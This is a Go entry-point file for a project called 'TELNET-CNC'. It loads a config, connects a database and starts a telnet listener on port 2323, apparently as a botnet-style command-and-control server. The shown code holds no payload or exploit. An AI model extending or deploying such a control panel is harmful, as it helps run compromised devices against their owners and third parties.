package main

import (
	"fmt"
	"log"
	"net"
	"os"

	"github.com/BurntSushi/toml"

	"TELNET-CNC/core"
)

type Config struct {
	General struct {
		Name    string
		Version string
	}
	Telnet struct {
		Host string
		Port int
	}
	Database struct {
		Path string
	}
}

func loadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var c Config
	if err := toml.Unmarshal(data, &c); err != nil {
		return nil, err
	}
	if c.General.Name == "" {
		c.General.Name = "TELNET-CNC"
	}
	if c.General.Version == "" {
		c.General.Version = "1.0.0"
	}
	if c.Telnet.Port == 0 {
		c.Telnet.Port = 2323
	}
	if c.Database.Path == "" {
		c.Database.Path = "cnc.db"
	}
	return &c, nil
}

func outboundIP(host string) string {
	if host != "0.0.0.0" && host != "" && host != "::" {
		return host
	}
	c, err := net.Dial("udp", "8.8.8.8:80")
	if err == nil {
		defer c.Close()
		if a, ok := c.LocalAddr().(*net.UDPAddr); ok {
			return a.IP.String()
		}
	}
	return "127.0.0.1"
}

func main() {
	log.SetFlags(0)

	fmt.Println()
	fmt.Println("  ╔═══════════════════════════╗")
	fmt.Println("  ║      TELNET-CNC v1.0      ║")
	fmt.Println("  ╚═══════════════════════════╝")
	fmt.Println()

	path := "config.toml"
	if len(os.Args) > 1 {
		path = os.Args[1]
	}

	cfg, err := loadConfig(path)
	if err != nil {
		log.Fatalf("  [!] config: %s", err)
	}
	fmt.Printf("  [+] Config: %s\n", path)

	if err := core.ConnectDB(cfg.Database.Path); err != nil {
		log.Fatalf("  [!] database: %s", err)
	}
	defer core.CloseDB()
	fmt.Printf("  [+] Database: %s\n", cfg.Database.Path)

	fmt.Printf("  [+] Telnet: %s:%d\n\n", outboundIP(cfg.Telnet.Host), cfg.Telnet.Port)
	fmt.Println("  Ready. Waiting for connections...")
	fmt.Println()

	if err := core.StartTelnet(cfg.Telnet.Host, cfg.Telnet.Port); err != nil {
		log.Fatalf("  [!] telnet: %s", err)
	}
}
